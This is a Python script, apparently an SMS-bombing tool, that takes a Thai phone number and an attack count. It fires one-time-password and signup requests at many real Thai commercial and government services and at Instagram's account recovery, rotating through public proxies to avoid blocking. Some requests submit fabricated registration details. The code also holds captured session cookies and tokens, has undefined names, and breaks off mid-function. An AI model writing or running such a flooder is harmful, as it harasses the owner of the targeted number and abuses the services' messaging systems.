import requests as ru
import threading
import requests
import time
import random
import os
import datetime
import sys
from concurrent.futures import ThreadPoolExecutor
from re import search
from requests import Session,post,get
from bs4 import BeautifulSoup as bs
from user_agent import generate_user_agent
from random import choice
os.system("clear")

threading = ThreadPoolExecutor(max_workers=int(1000000))
headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}
proxy = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt").text
f = open("proxy.txt", "w")
t = f.write(proxy)
g = open("proxy.txt", "r")
s = g.read().splitlines()


def run():
	print('''
    \x1b[31m BY.OSHELL
    \x1b[00m[\x1b[31m+\x1b[00m] \x1b[35m1-99999999
	''')
	phone = input(" \x1b[96mPHONE-NUMBER  : \x1b[92m")
	
	if int(phone) <= 99999999 or int(phone) >= 999999999:
		print()
		print('\x1b[92m[ NONAME ]\x1b[00m : \x1b[91mใส่เบอร์ให้ถูก THAILAND [ ! ] \x1b[00m')
		time.sleep(2)
		os.system('clear')
	else:
		phone = phone
		jam = int(input("\x1b[96m AMOUNT-ATTACK : \x1b[92m"))
		jam = jam
		print()
		print()
		SMS(phone, jam)
		
def randomString(N):
    return ''.join(choice(ascii_uppercase + digits) for _ in range(N))
    

def api1(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
    "https://www.carsome.co.th/website/login/sendSMS",
    headers={
      "user-agent":
      "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
      "cookie":
      "amp_893e6b=w-newQWGaJ9H7YmD5KD1Jg...1g6l3e5ht.1g6l3e5ht.0.0.0;cky-active-check=yes;ajs_anonymous_id=bc6fbe42-9d69-40d9-93db-ba6b777861c1;_gcl_au=1.1.1543614339.1656418159;_ALGOLIA=anonymous-0a2bcc78-8c2b-4051-bfea-97cb347b1e17;__lt__cid=f282ddb1-0630-4c9e-ab88-27f6bd651a35;__lt__sid=530143c9-c9d21696;cookieyesID=R1V5aHU4eWswY21YbjM0NHFGb1FVc1pObDc3U2NSYkk=;moe_uuid=ff0db811-2642-4a84-83a3-7dd26d9c33a1;__cf_bm=4SQWD6XX3mlhMhXrkJ8A1.4MzqJ80OVt9BMJ9NH5uFw-1656418177-0-AdYubBhGil+XHg2/1J8WHy36qRL2urjlZUNUYGwGOkQyg0wlFLvwXAv8ugmj2IdM5ZaTfFxlz/2lRwsTuRRxnrQ=;cky-consent=no;cookieyes-necessary=yes;cookieyes-functional=no;cookieyes-analytics=no;cookieyes-performance=no;cookieyes-advertisement=no;cookieyes-other=no"
    },
    json={
      "username": phone,
      "optType": 0
    },
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success API1 | {r.status_code}"
    )
  else:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   API1 | {r.status_code}"
    )
    
def api2(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  send = Session()
  send.headers.update({
    "user-agent":
    "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
    'content-type':
    'application/x-www-form-urlencoded; charset=UTF-8'
  })
  sms = send.post("https://api.jobbkk.com/v1/easy/otp_code",
                  data="mobile=" + phone,
                  proxies={'http': 'http://' + random.choice(s)})
  if sms.status_code == 200 or sms.status_code == 201:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success API2 | {sms.status_code}"
    )
  else:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   API2 | {sms.status_code}"
    )

def api3(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  session = Session()
  ReqTOKEN = session.get(
    "https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated",
    headers={
      "User-Agent":
      "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"
    }).text
  r = session.post(
    "https://srfng.ais.co.th/login/sendOneTimePW",
    data=
    f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",
    headers={
      "User-Agent":
      "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
      "Content-Type":
      "application/x-www-form-urlencoded; charset=UTF-8",
      "authorization":
      f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''
    },
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success API3 | {r.status_code}"
    )
  else:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   API3 | {r.status_code}"
    )
    
def api4(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
    "https://openapi.bigc.co.th/customer/v1/otp",
    headers={
      "user-agent":
      "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
      "content-type": "application/json"
    },
    json={"phone_no": phone},
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success API4 | {r.status_code}"
    )
  else:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   API4 | {r.status_code}"
    )

def api5(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.get(
    f"https://users.cars24.co.th/oauth/consumer-app/otp/{phone[1:]}?gaClientId=2050278932.1666930228&user-type=buyer&lang=th",
    headers={
      "user-agent":
      "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
      "cookie":
      "_gcl_au=1.1.786653043.1666930228;_gid=GA1.3.2033124357.1666930228;_dc_gtm_UA-65843992-28=1;_ga=GA1.3.2050278932.1666930228;_gaexp=GAX1.3.wdMsU-TcQXeB5H9GO-G4Tw.19357.1!AoYo68DrQk-jlcseD-b4FQ.19330.2!mDL1fU8cRPmYzvHq-QSfqg.19330.2;_fbp=fb.2.1666930233269.696060227;_hjSessionUser_2738441=eyJpZCI6IjA3ODJhN2RlLTEyNGItNWFjNy05MmE3LTcwNWE0YTllNTJiMSIsImNyZWF0ZWQiOjE2NjY5MzAyMzI3NzIsImV4aXN0aW5nIjpmYWxzZX0=;_hjFirstSeen=1;_hjSession_2738441=eyJpZCI6ImY1MzllZDk0LWJlMjQtNDM0ZS05OGY1LWI0ODZhM2MzYTBkMiIsImNyZWF0ZWQiOjE2NjY5MzAyMzMzNTMsImluU2FtcGxlIjp0cnVlfQ==;_hjAbsoluteSessionInProgress=1;cto_bundle=YVwhbF9hWWRuREsxRm5VZnFpWGVpM0FxdGNTZ201Y2s5REUyT2pxVVVqNGZiS2pQaG5meXN2SXVLMzBCJTJGS3BuNWV4WGklMkY0ZjQxT2tRQnQ1ZkRzU0NibTd3MGxNTFViSDRRR1BrU21vdm5YcyUyRm1Da0xWaXRXayUyRlpBYmV5MUlBMjNaUVJYMmVncnJOajUwa0t6ZndWJTJCcmMzYzBRJTNEJTNE;_ga_7VGYE5TTVG=GS1.1.1666930228.1.1.1666930253.35.0.0"
    },
    proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success API5 | {r.status_code}")
	else:
		print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   API5 | {r.status_code}")
		
def api6(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
    "https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp",
    data={"mobile_phone_no": phone},
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success API6 | {r.status_code}"
    )
  else:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   API6 | {r.status_code}"
    )
    
def api7(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://topping.truemoveh.com/api/get_request_otp", data=f"mobile_number={phone}",headers={"Accept": "application/json, text/plain, /","User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded","Referer": "https://topping.truemoveh.com/otp?callback=/campaign/104","Cookie": "_ga=GA1.2.1205060554.1640098569; _gcl_au=1.1.1987856152.1640098570; wisepops=%7B%22csd%22%3A1%2C%22popups%22%3A%7B%7D%2C%22sub%22%3A0%2C%22ucrn%22%3A57%2C%22cid%22%3A%2237257%22%2C%22v%22%3A4%2C%22bandit%22%3A%7B%22recos%22%3A%7B%7D%7D%7D; wisepops_props=%7B%22userType%22%3A%22non-true%22%7D; _fbp=fb.1.1640098573194.360235747; wisp-https%3A%2F%2Fapp.getwisp.co-Ly7y=88ce9a24-a734-4ee0-a698-20f8eddb4942; _gac_UA-34289891-14=1.1640601367.Cj0KCQiA5aWOBhDMARIsAIXLlkfb9M64-nkR8u0vdLiqqAhHzV1TK-wuYhvA4nvc76GLMd_LvbDYizMaAruSEALw_wcB; ci_session=dbskqg6a8lqknf9n1cep0jb5vrrhkqdi; AWSELB=87C963610CC5C30592B0F71CAEE836AADF65AFF7868D84BE668BFDE38423D810F8497FAC88813163C52320060AF1A0D59D6D0AECF99D0389471FA83C1B90863201109E903015CCAF2CCBA3F11A5EDD799554400EE1; _gid=GA1.2.1638141276.1641466031; _gac_UA-41231050-25=1.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat=1; _gcl_aw=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gcl_dc=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat_UA-41231050-25=1; wisepops_visits=%5B%222022-01-06T10%3A47%3A11.626Z%22%2C%222022-01-04T16%3A54%3A03.887Z%22%2C%222021-12-28T10%3A38%3A18.612Z%22%2C%222021-12-28T10%3A38%3A04.394Z%22%2C%222021-12-28T10%3A37%3A40.387Z%22%2C%222021-12-27T03%3A47%3A11.187Z%22%2C%222021-12-25T12%3A27%3A55.196Z%22%2C%222021-12-23T17%3A48%3A39.146Z%22%2C%222021-12-21T17%3A56%3A55.678Z%22%2C%222021-12-21T15%3A06%3A46.971Z%22%5D; wisepops_session=%7B%22arrivalOnSite%22%3A%222022-01-06T10%3A47%3A11.626Z%22%2C%22mtime%22%3A1641466036863%2C%22pageviews%22%3A2%2C%22popups%22%3A%7B%7D%2C%22bars%22%3A%7B%7D%2C%22countdowns%22%3A%7B%7D%2C%22src%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22utm%22%3A%7B%22gclid%22%3A%22yes%22%7D%2C%22testIp%22%3Anull%7D"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success API7 | {r.status_code}")
	else:
		print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   API7 | {r.status_code}")

def api8(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
    "https://www.beauticool.com/?m=request_otp",
    headers={
      "user-agent":
      "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
      "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
      "cookie":
      "PHPSESSID=rhq2hpsfsr3u3ji2pie67j99u0;_ga=GA1.1.1106451021.1666928426;trustedsite_visit=1;loadapp=true;_ga_PZZ327LRJ2=GS1.1.1666928426.1.1.1666928451.0.0.0",
      "x-requested-with": "XMLHttpRequest"
    },
    data=f"tel={phone}",
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success API8 | {r.status_code}"
    )
  else:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   API8 | {r.status_code}"
    )
    
def api9(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.get(
    f"https://users.cars24.co.th/oauth/consumer-app/otp/{phone[1:]}?gaClientId=2050278932.1666930228&user-type=buyer&lang=th",
    headers={
      "user-agent":
      "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
      "cookie":
      "_gcl_au=1.1.786653043.1666930228;_gid=GA1.3.2033124357.1666930228;_dc_gtm_UA-65843992-28=1;_ga=GA1.3.2050278932.1666930228;_gaexp=GAX1.3.wdMsU-TcQXeB5H9GO-G4Tw.19357.1!AoYo68DrQk-jlcseD-b4FQ.19330.2!mDL1fU8cRPmYzvHq-QSfqg.19330.2;_fbp=fb.2.1666930233269.696060227;_hjSessionUser_2738441=eyJpZCI6IjA3ODJhN2RlLTEyNGItNWFjNy05MmE3LTcwNWE0YTllNTJiMSIsImNyZWF0ZWQiOjE2NjY5MzAyMzI3NzIsImV4aXN0aW5nIjpmYWxzZX0=;_hjFirstSeen=1;_hjSession_2738441=eyJpZCI6ImY1MzllZDk0LWJlMjQtNDM0ZS05OGY1LWI0ODZhM2MzYTBkMiIsImNyZWF0ZWQiOjE2NjY5MzAyMzMzNTMsImluU2FtcGxlIjp0cnVlfQ==;_hjAbsoluteSessionInProgress=1;cto_bundle=YVwhbF9hWWRuREsxRm5VZnFpWGVpM0FxdGNTZ201Y2s5REUyT2pxVVVqNGZiS2pQaG5meXN2SXVLMzBCJTJGS3BuNWV4WGklMkY0ZjQxT2tRQnQ1ZkRzU0NibTd3MGxNTFViSDRRR1BrU21vdm5YcyUyRm1Da0xWaXRXayUyRlpBYmV5MUlBMjNaUVJYMmVncnJOajUwa0t6ZndWJTJCcmMzYzBRJTNEJTNE;_ga_7VGYE5TTVG=GS1.1.1666930228.1.1.1666930253.35.0.0"
    },
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success API9 | {r.status_code}"
    )
  else:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   API9 | {r.status_code}"
    )

def api10(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post("https://api-sso.ch3plus.com/user/request-otp",
                    headers={'user-agent': generate_user_agent()},
                    json={
                      "tel": phone,
                      "type": "login"
                    })
  if r.status_code == 200 or r.status_code == 201:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success API10 | {r.status_code}"
    )
  else:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   API10 | {r.status_code}"
    )
    
def api11(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	head = {
	    "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..o2KGFaI9sj29aEhCf9hApg.8hkBGU4xqfvuMOjMnNVDZjwqkjUcapX7Nnm4r5NZ-LsHH54KqovZT8OcwskjsUoh0_8NKc7aBicXTwiVy-yR_lly-2hWlWsxCG8cR-ucaKrjhJPzHMoLHdw8TKNeeIq5kGuyTsmB-WVAxDn7G5-v0Q.RkQDS8sYQYMpTilU1VOz1A",
	    "content-type": "application/json; charset=utf-8",
	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "accept": "*/*",
	    "referer": "https://nocnoc.com/login",
	    "cookie": "_gcl_au=1.1.2015626896.1637433514;_ga=GA1.2.2121914407.1637433515;__lt__cid=4ba7a030-4806-44f7-b0bc-eb65b3b9b13f;_fbp=fb.1.1637433519859.82249249;_hjSessionUser_1027858=eyJpZCI6IjExYjI1OTM1LWExZmItNTNjZS1hN2RlLTc4YmQwMjQzNmRkZCIsImNyZWF0ZWQiOjE2Mzc0MzM1MTkwMjUsImV4aXN0aW5nIjp0cnVlfQ==;ajs_anonymous_id=%22b70a4a48-dc6e-407c-9a31-37cb925d24e0%22;__lt__sid=dfc427cb-21404fe4;_gid=GA1.2.1348859339.1639856210;_gat_gaTracker=1;_hjSession_1027858=eyJpZCI6Ijk5MWY0ZjhlLTI0MjAtNDA2YS05MjM0LTJkYTliMzU4OTBkYyIsImNyZWF0ZWQiOjE2Mzk4NTYyMTIyNzV9;_hjIncludedInSessionSample=0;_hjAbsoluteSessionInProgress=0;cto_bundle=hwhaQ19FRiUyRlI5b0h0T1B5YlBlUG1YQzBEWmlxUDhqWDNBT3Qyc0hKVXBsJTJCazNaUlJFMHVMem5DMEh3OEJYUFNnWUI1MGhiSGVkOG9ab3NoUjNMbSUyRnpUd2N4SWU3Q1lnYkZvUnZsJTJGZTVveldmRWliWW5SYWhrJTJCbkxNTmhOaFBSOGNrQlhDRmUwQVpaVW41Q3ElMkJ0Yk9yNVJjVGclM0QlM0Q;_gat_UA-124531227-1=1"
	    }
	r = requests.post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.684",headers=head,json={"lang":"th","userType":"BUYER","locale":"th","orgIdfier":"scg","phone":phone,"type":"signup","otpTemplate":"buyer_signup_otp_message","userParams":{"buyerName":"ฟงฟง ฟงฟว"}},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success API11 | {r.status_code}")
	else:
		print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   API11 | {r.status_code}")


def ig_token():
  d = get("https://www.instagram.com/", headers=headers).headers['set-cookie']
  d = search("csrftoken=(.*);", d).group(1).split(";")
  return d[0], d[10].replace(" Secure, ig_did=", "")


def apiig(phone):
    da = datetime.datetime.now()
    ok = da.strftime("%H:%M:%S")
    token, _ = ig_token()
    d = request.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username=66{phone}&recaptcha_challenge_field=",headers={"Content-Type": "application/x-www-form-urlencoded","X-Requested-With": "XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","X-CSRFToken": token},proxies={'http': 'http://' + random.choice(s)}).json()
    if d.status_code == 200 or d.status_code == 201:
        print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success APIIG | {d.status_code}")
    else:
        print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success APIIG | {d.status_code}")

    
def api12(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
    "https://api2.1112.com/api/v1/otp/create",
    headers={
      "content-type":
      "application/json;charset=UTF-8",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"
    },
    json={
      "phonenumber": phone,
      "language": "th"
    },
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success API12 | {r.status_code}"
    )
  else:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   API12| {r.status_code}"
    )
    
def api13(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER",proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success API13 | {r.status_code}")
	else:
		print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   API13 | {r.status_code}")
		
def api14(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r= requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value":phone,"country":"66"},"type":"mobile"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   API14 | {r.status_code}")
		
def api15(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
    "https://api.giztix.com/graphql",
    headers={
      "user-agent":
      "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
    },
    json={
      "operationName":
      "OtpGeneratePhone",
      "variables": {
        "phone": f"66{phone[1:]}"
      },
      "query":
      "mutation OtpGeneratePhone($phone: ID!) {\n  otpGeneratePhone(phone: $phone) {\n    ref\n    __typename\n  }\n}\n"
    },
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success API15 | {r.status_code}"
    )
  else:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False  API15 | {r.status_code}"
    )
    
def api16(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
    "https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",
    json={
      "username": phone,
      "password": "6302814184624az",
      "name": "0903281894",
      "provinceCode": "28",
      "districtCode": "393",
      "subdistrictCode": "3494",
      "zipcode": "40260",
      "siebelCustomerTypeId": "710",
      "acceptTermAndCondition": "true",
      "hasSeenConsent": "false",
      "locale": "th_TH"
    },
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success API16 | {r.status_code}"
    )
  else:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False  API16 | {r.status_code}"
    )
    
def api17(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
    "https://api.ulive.youpik.com/api-base/sms/sendCode",
    headers={
      "authorization":
      "Basic d2ViQXBwOndlYkFwcA==",
      "content-type":
      "application/x-www-form-urlencoded;charset=UTF-8",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"
    },
    data=f"phone={phone[1:]}&type=1",
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success API17 | {r.status_code}"
    )
  else:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False  API17 | {r.status_code}"
    )
    
def api18(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
    "https://vaccine.trueid.net/vacc-verify/api/getotp",
    headers={
      "user-agent":
      "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
      "content-type":
      "application/json;charset=UTF-8",
      "accept":
      "application/json, text/plain, */*",
      "cookie":
      "_gcl_au=1.1.628507904.1657519113;_cbclose=1;_cbclose26068=1;_uid26068=51BC4E60.1;_ctout26068=1;verify=test;_ga=GA1.2.682897436.1657519114;_gid=GA1.2.1721036016.1657519114;_gat_UA-86733131-1=1;_fbp=fb.1.1657519114976.1588263006;afUserId=64e5ba75-c9e2-4e45-aa62-7f5318ec6d9c-p;AF_SYNC=1657519116965;_ga_R05PJC3ZG8=GS1.1.1657519113.1.1.1657519130.43;OptanonAlertBoxClosed=2022-07-11T05:58:54.186Z;OptanonConsent=isIABGlobal=false&datestamp=Mon+Jul+11+2022+12%3A58%3A54+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.13.0&hosts=&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1%2CC0005%3A1"
    },
    json={
      "msisdn": phone,
      "function": "enroll"
    },
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success API18 | {r.status_code}"
    )
  else:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False  API18 | {r.status_code}"
    )
    
def api19(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.get(
    f'https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code&phone={phone}',
    headers={
      "accept":
      "application/json, text/javascript, */*; q=0.01",
      "x-requested-with":
      "XMLHttpRequest",
      "user-agent":
      generate_user_agent(),
      "cookie":
